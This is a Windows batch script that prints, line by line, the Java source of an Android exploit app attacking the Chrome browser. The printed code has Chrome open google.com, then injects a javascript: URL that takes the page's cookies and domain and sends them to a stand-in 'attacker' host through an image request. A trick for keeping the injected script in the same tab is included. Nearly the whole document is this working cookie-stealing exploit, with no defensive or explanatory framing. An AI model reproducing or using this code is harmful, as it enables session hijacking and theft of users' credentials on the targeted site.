echo off
title Exploit%random%
cls
timeout /t 1 /nobreak >> nul
echo.
echo. 
echo package jp.mbsd.terada.attackchrome1;
echo. 
echo import android.app.Activity;
echo import android.os.Bundle;
echo import android.content.Intent;
echo import android.net.Uri;
echo public class Main extends Activity {
echo @Override
echo public void onCreate(Bundle savedInstanceState) {
echo super.onCreate(savedInstanceState);
echo setContentView(R.layout.main);
echo doit();
echo }
echo.
timeout /t 1 /nobreak >> nul
echo // get intent to invoke the chrome app
echo public Intent getIntentForChrome(String url) {
echo Intent intent = new Intent("android.intent.action.VIEW");
echo Intent.setClassName("com.android.chrome", "com.google.android.apps.chrome.Main");
echo intent.setData(Uri.parse(url));
echo return intent;
echo }
echo. 
echo public void doit() {
echo try {
echo // At first, force the chrome app to open a target Web page
echo Intent intent1 = getIntentForChrome("http://www.google.com/1");
echo startActivity(intent1);
echo // wait a few seconds
echo Thread.sleep(3000);
echo // JS code to inject into the target (www.google.com)
echo.
timeout /t 1 /nobreak >> nul
echo String jsURL = "javascript:var e=encodeURIComponent,img=document.createElement('img');"
echo + "img.src='http://attacker/?c='+e(document.cookie)+'&d='+e(document.domain);"
echo + "document.body.appendChild(img);";
echo Intent intent2 = getIntentForChrome(jsURL);
echo // Trick to prevent Chrome from opening the JS URL in a different tab
echo intent2.putExtra("com.android.browser.application_id", "com.android.chrome");
echo intent2.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
echo // Inject JS into the target Web page
echo startActivity(intent2);
echo }
echo catch (Exception e) {}
echo }
echo }
timeout /t 1 /nobreak >> nul
exit

